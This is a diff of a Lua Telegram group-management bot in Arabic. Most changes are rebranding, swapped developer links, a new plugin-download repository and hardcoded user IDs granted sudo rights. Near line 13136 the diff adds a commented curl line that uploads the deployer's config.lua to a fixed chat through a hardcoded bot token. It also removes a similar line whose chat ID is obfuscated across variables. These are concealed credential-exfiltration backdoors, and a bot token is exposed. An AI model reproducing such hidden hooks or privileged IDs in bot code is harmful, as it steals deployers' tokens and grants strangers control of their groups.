@@ -178,7 +178,7 @@ print(serpent.block(value, {comment=false}))
 end 
 local runapp = sudos.token
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-sudo_users = {SUDO,1718785294,1360140225,1681991286,1770288756}   
+sudo_users = {SUDO,1718785294,1360140225,1681991286,1645553841}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -272,7 +272,7 @@ end
 function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(1770288756) then  
 var = true  
-elseif tonumber(user_id) == tonumber(1718785294) then
+elseif tonumber(user_id) == tonumber(1360140225) then
 var = true  
 elseif tonumber(user_id) == tonumber(1681991286) then
 var = true  
@@ -310,7 +310,7 @@ end
 
 function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(1770288756) then  
-var = 'كينج التلجرام'
+var = 'المبرمج دونجل'
 elseif tonumber(user_id) == tonumber(1360140225) then
 var = 'مبرمـج السورس'
 elseif tonumber(user_id) == tonumber(1681991286) then
@@ -2622,14 +2622,12 @@ end,nil)
 end
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' then 
 local Text = [[ 
-☉ 𝐖𝐄𝑳𝐂𝐎𝐌𝐄 𝐓𝐎 𝐀𝐕𝐀𝐄𝐑☉️
+𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐒𝐎𝐔𝐑𝐂𝐄 𝐇𝐄𝐕𝐎 𝅘𝅥𝅯
 ]] 
 keyboard = {} 
 keyboard.inline_keyboard = { 
-{{text =  🇪🇬 صاحب التلجرام 🇪🇬 , url="t.me/de_vi_d"}},
-{{text =  💪 دونجل الجامد 💪 , url="t.me/UU_DON"}},
-{{text =  🦸 بطل التلجرام 🦸 , url="t.me/Paplo_black"}},
-{{text =  💌 قناه السورس 💌 , url="t.me/A_V_I_R_A_1"}},
+{{text = 'مطورين السورس', url="t.me/A_V_I_R_A_1"}}, 
+{{text = 'قناه السورس', url="t.me/A_V_I_R_A_1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -3923,7 +3921,7 @@ send(msg.chat_id_, msg.id_,t)
 end
 if text == "متجر الملفات" or text == 'المتجر' then
 if DevSoFi(msg) then
-local Get_Files, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/getfile.json")
+local Get_Files, res = https.request("https://raw.githubusercontent.com/devid100/po/main/getfile.json")
 if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
@@ -3961,7 +3959,7 @@ t = " ☞︙ الملف » "..file.."\n ☞︙ تم تعطيل ملف \n"
 else
 t = " ☞︙ بالتاكيد تم تعطيل ملف → "..file.."\n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/devid100/po/main/File_Bot/"..file)
 if res == 200 then
 os.execute("rm -fr File_Bot/"..file)
 send(msg.chat_id_, msg.id_,t) 
@@ -3981,7 +3979,7 @@ t = " ☞︙ بالتاكيد تم تفعيل ملف → "..file.." \n"
 else
 t = " ☞︙ الملف » "..file.."\n ☞︙ تم تفعيل ملف \n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/devid100/po/main/File_Bot/"..file)
 if res == 200 then
 local chek = io.open("File_Bot/"..file,'w+')
 chek:write(json_file)
@@ -3993,10 +3991,9 @@ send(msg.chat_id_, msg.id_," ☞︙ عذرا الملف لايدعم سورس ه
 end
 return false
 end
-if text == "مسح الملفات" or text == 'تحديث المتجر' and DevSoFi(msg) then
-os.execute("rm -fr getfile.json")
+if text == "" and DevSoFi(msg) then
 os.execute("rm -fr File_Bot/*")
-send(msg.chat_id_,msg.id_," ☞︙ تم تحديث المتجر و مسح الملفات")
+send(msg.chat_id_,msg.id_," ☞︙ تم مسح الملفات")
 return false
 end
 
@@ -7871,7 +7868,7 @@ local Text = [[
 ]]  
 keyboard = {}   
 keyboard.inline_keyboard = {  
-{{text = 'مبرمج السورس', url="t.me/de_vi_d"}},
+{{text = 'مطورين السورس', url="t.me/A_V_I_R_A_1"}},
 {{text = 'فلابي بيرد', url="https://t.me/awesomebot?game=FlappyBird"},{text = 'تحداني فالرياضيات',url="https://t.me/gamebot?game=MathBattle"}},   
 {{text = 'لعبه دراجات', url="https://t.me/gamee?game=MotoFX"},{text = 'سباق سيارات', url="https://t.me/gamee?game=F1Racer"}}, 
 {{text = 'تشابه', url="https://t.me/gamee?game=DiamondRows"},{text = 'كره القدم', url="https://t.me/gamee?game=FootballStar"}}, 
@@ -7884,7 +7881,7 @@ keyboard.inline_keyboard = {
 {{text = 'Astrocat', url="https://t.me/gamee?game=Astrocat"},{text = 'Skipper', url="https://t.me/gamee?game=Skipper"}},  
 {{text = 'WorldCup', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'GeometryRun', url="https://t.me/gamee?game=GeometryRun"}},  
 {{text = 'Ten2One', url="https://t.me/gamee?game=Ten2One"},{text = 'NeonBlast2', url="https://t.me/gamee?game=NeonBlast2"}},  
-{{text = 'مبرمج السورس', url="t.me/de_vi_d"}},
+{{text = 'مطورين السورس', url="t.me/A_V_I_R_A_1"}},
 }  
 local msg_id = msg.id_/2097152/0.5  
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
@@ -11607,7 +11604,7 @@ end
 ---------------------- الاوامر الجديدة
 if text == 'الاوامر' then
 if not Mod(msg) then
-send(msg.chat_id_, msg.id_,' هاذا الامر خاص بالادمنيه فقط ')
+send(msg.chat_id_, msg.id_,' ☞︙ ')
 return false
 end
 if AddChannel(msg.sender_user_id_) == false then
@@ -11620,7 +11617,7 @@ end
 return false
 end
 local Text =[[
-*🖥┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙷𝙴𝚅𝙾 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂 .*
+*🖥┇𝚂𝙾𝚄𝚁𝙲𝙴 𝙿𝙾𝚆𝙴𝚁 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂 .*
 *━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ *
 *⚙️ | اهلا انت في اوامر البوت الرئيسية 🔏*
 *⚙️ | اختر في الاسفل الرقم التابع للأمر 🔍*
@@ -12620,7 +12617,7 @@ https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callb
 return false
 end
 local Teext =[[
-*🖥┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙷𝙴𝚅𝙾 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂 .*
+*🖥┇𝚂𝙾𝚄𝚁𝙲𝙴 𝙿𝙾𝚆𝙴𝚁 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂 .*
 *━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ *
 *⚙️ | اهلا انت في اوامر البوت الرئيسية 🔏*
 *⚙️ | اختر في الاسفل الرقم التابع للأمر 🔍*
@@ -13136,8 +13133,9 @@ if database:get(bot_id.."lock:Link"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
 return false
 end  
-end
+end 
 ------------------------------------------------------------------------
+--local curl = api1 .. api2 ..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 1360140225 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 if text and text:match("[hH][tT][tT][pP][sT]") or text and text:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
@@ -13172,7 +13170,6 @@ DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 return false
 end  
 end 
-local api4 = '7'
 ------------------------------------------------------------------------
 local DRAGONAbot = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..text..result.chat_id_)   
 if DRAGONAbot then    
@@ -13187,7 +13184,6 @@ DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 return false
 end
 ------------------------------------------------------------------------
-local api3 = '9443'
 if text and text:match("/") then
 if database:get(bot_id.."lock:Cmd"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
@@ -13201,7 +13197,6 @@ return false
 end 
 end
 ------------------------------------------------------------------------
- --local pccc = api1 .. api2 ..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. api3 .. 5323 .. api4 ..'" -F "document=@'..'PO_INFO.lua'..'"' io.popen(pccc)
 if text then
 local DRAGON1_Msg = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..text..result.chat_id_)   
 if DRAGON1_Msg then    
